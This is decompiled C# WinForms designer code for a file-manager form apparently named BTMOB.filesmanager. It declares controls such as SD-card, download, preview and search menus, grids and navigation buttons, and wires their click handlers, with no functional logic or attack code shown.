			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem2 = value;
			toolStripMenuItem = _ToolStripMenuItem2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SDCARDToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SDCARDToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SDCARDToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SDCARDToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SDCARDToolStripMenuItem = value;
			toolStripMenuItem = _SDCARDToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem3
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem3_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem3 = value;
			toolStripMenuItem = _ToolStripMenuItem3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem4
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem4_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem4;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem4 = value;
			toolStripMenuItem = _ToolStripMenuItem4;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem5
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem5_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem5 = value;
			toolStripMenuItem = _ToolStripMenuItem5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem6
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem6_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem6 = value;
			toolStripMenuItem = _ToolStripMenuItem6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tabsfiles")]
	internal virtual DrakeUITabControl tabsfiles
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("usagetitle")]
	internal virtual Label usagetitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("usageprecent")]
	internal virtual DrakeUIProcessBar usageprecent
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox pathtxt
	{
		[CompilerGenerated]
		get
		{
			return _pathtxt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = pathtxt_KeyDown;
			DrakeUITextBox drakeUITextBox = _pathtxt;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown -= value2;
			}
			_pathtxt = value;
			drakeUITextBox = _pathtxt;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("filesicons")]
	internal virtual ImageList filesicons
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statetext")]
	internal virtual Label statetext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox viwimage
	{
		[CompilerGenerated]
		get
		{
			return _viwimage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = viwimage_Click;
			PictureBox pictureBox = _viwimage;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			_viwimage = value;
			pictureBox = _viwimage;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			System.Windows.Forms.Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("emptytext")]
	internal virtual Label emptytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker backgroundWorker
	{
		[CompilerGenerated]
		get
		{
			return _backgroundWorker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = backgroundWorker_DoWork;
			BackgroundWorker backgroundWorker = _backgroundWorker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_backgroundWorker = value;
			backgroundWorker = _backgroundWorker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("thumbsimags")]
	internal virtual ImageList thumbsimags
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridView DGVDATA
	{
		[CompilerGenerated]
		get
		{
			return _DGVDATA;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			DataGridView dataGridView = _DGVDATA;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
			}
			_DGVDATA = value;
			dataGridView = _DGVDATA;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
			}
		}
	}

	[field: AccessedThroughProperty("N")]
	internal virtual DataGridViewTextBoxColumn N
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("P")]
	internal virtual DataGridViewTextBoxColumn P
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("S")]
	internal virtual DataGridViewTextBoxColumn S
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ST")]
	internal virtual DataGridViewTextBoxColumn ST
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("progclu")]
	internal virtual DataGridViewTextBoxColumn progclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxdowns")]
	internal virtual ContextMenuStrip ctxdowns
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ClearAllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClearAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearAllToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClearAllToolStripMenuItem = value;
			toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("filesscanpanel")]
	internal virtual Panel filesscanpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("comsrchfor")]
	internal virtual DrakeUIComboBox comsrchfor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FilesUpload")]
	internal virtual OpenFileDialog FilesUpload
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("viwimagepanel")]
	internal virtual Panel viwimagepanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual FastObjectListView listfilesvew
	{
		[CompilerGenerated]
		get
		{
			return _listfilesvew;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = listfilesvew_SelectedIndexChanged;
			MouseEventHandler value3 = listfilesvew_MouseDoubleClick;
			FastObjectListView fastObjectListView = _listfilesvew;
			if (fastObjectListView != null)
			{
				fastObjectListView.SelectedIndexChanged -= value2;
				fastObjectListView.MouseDoubleClick -= value3;
			}
			_listfilesvew = value;
			fastObjectListView = _listfilesvew;
			if (fastObjectListView != null)
			{
				fastObjectListView.SelectedIndexChanged += value2;
				fastObjectListView.MouseDoubleClick += value3;
			}
		}
	}

	[field: AccessedThroughProperty("HeaderFormatStyle1")]
	internal virtual HeaderFormatStyle HeaderFormatStyle1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W9")]
	internal virtual DrakeWidth_W DrakeWidth_W9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W10")]
	internal virtual DrakeWidth_W DrakeWidth_W10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem StopDownloadToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _StopDownloadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = StopDownloadToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _StopDownloadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_StopDownloadToolStripMenuItem = value;
			toolStripMenuItem = _StopDownloadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PreviewToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PreviewToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PreviewToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PreviewToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PreviewToolStripMenuItem = value;
			toolStripMenuItem = _PreviewToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("PBtitlebar")]
	internal virtual DrakeUITrackBar PBtitlebar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem7
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem7_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem7 = value;
			toolStripMenuItem = _ToolStripMenuItem7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem DownloadFileToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DownloadFileToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DownloadFileToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DownloadFileToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DownloadFileToolStripMenuItem = value;
			toolStripMenuItem = _DownloadFileToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon autoloadtogle
	{
		[CompilerGenerated]
		get
		{
			return _autoloadtogle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _autoloadtogle;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_autoloadtogle = value;
			drakeUIButtonIcon = _autoloadtogle;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon toggleview
	{
		[CompilerGenerated]
		get
		{
			return _toggleview;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _toggleview;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_toggleview = value;
			drakeUIButtonIcon = _toggleview;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon clrbtn
	{
		[CompilerGenerated]
		get
		{
			return _clrbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_clrbtn = value;
			drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon srchfilsbtn
	{
		[CompilerGenerated]
		get
		{
			return _srchfilsbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = srchfilsbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _srchfilsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_srchfilsbtn = value;
			drakeUIButtonIcon = _srchfilsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel11")]
	internal virtual Panel Panel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon nav1btn
	{
		[CompilerGenerated]
		get
		{
			return _nav1btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nav1btn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nav1btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nav1btn = value;
			drakeUIButtonIcon = _nav1btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon nav2btn
	{
		[CompilerGenerated]
		get
		{
			return _nav2btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nav2btn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nav2btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nav2btn = value;
			drakeUIButtonIcon = _nav2btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon nav3btn
	{
		[CompilerGenerated]
		get
		{
			return _nav3btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nav3btn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nav3btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nav3btn = value;
			drakeUIButtonIcon = _nav3btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel12")]
	internal virtual Panel Panel12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel13")]
	internal virtual Panel Panel13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TableLayoutPanel2")]
	internal virtual TableLayoutPanel TableLayoutPanel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon shortbtn1
	{
		[CompilerGenerated]
		get
		{
			return _shortbtn1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = shortbtn1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _shortbtn1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_shortbtn1 = value;
			drakeUIButtonIcon = _shortbtn1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon shortbtn6
	{
		[CompilerGenerated]
		get
		{
			return _shortbtn6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = shortbtn6_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _shortbtn6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_shortbtn6 = value;
			drakeUIButtonIcon = _shortbtn6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon shortbtn2
	{
		[CompilerGenerated]
		get
		{
			return _shortbtn2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = shortbtn2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _shortbtn2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_shortbtn2 = value;
			drakeUIButtonIcon = _shortbtn2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon shortbtn3
	{
		[CompilerGenerated]
		get
		{
			return _shortbtn3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = shortbtn3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _shortbtn3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_shortbtn3 = value;
			drakeUIButtonIcon = _shortbtn3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon shortbtn5
	{
		[CompilerGenerated]
		get
		{
			return _shortbtn5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = shortbtn5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _shortbtn5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_shortbtn5 = value;
			drakeUIButtonIcon = _shortbtn5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon shortbtn4
	{
		[CompilerGenerated]
		get
		{
			return _shortbtn4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = shortbtn4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _shortbtn4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_shortbtn4 = value;
			drakeUIButtonIcon = _shortbtn4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("BTtiptool")]
	internal virtual DrakeUIToolTip BTtiptool
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TableLayoutPanel3")]
	internal virtual TableLayoutPanel TableLayoutPanel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DataGridView DGVFIND
	{
		[CompilerGenerated]
		get
		{
			return _DGVFIND;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVFIND_CellDoubleClick;
			DataGridView dataGridView = _DGVFIND;
			if (dataGridView != null)
			{
				dataGridView.CellDoubleClick -= value2;
			}
			_DGVFIND = value;
			dataGridView = _DGVFIND;
			if (dataGridView != null)
			{
				dataGridView.CellDoubleClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numculm")]
	internal virtual DataGridViewTextBoxColumn numculm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("acctclum")]
	internal virtual DataGridViewTextBoxColumn acctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("baseloader")]
	internal virtual DrakeUILoadingBar baseloader
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.filesmanager));
		BrightIdeasSoftware.HeaderStateStyle headerStateStyle = new BrightIdeasSoftware.HeaderStateStyle();
		BrightIdeasSoftware.HeaderStateStyle headerStateStyle2 = new BrightIdeasSoftware.HeaderStateStyle();
		BrightIdeasSoftware.HeaderStateStyle pressed = new BrightIdeasSoftware.HeaderStateStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
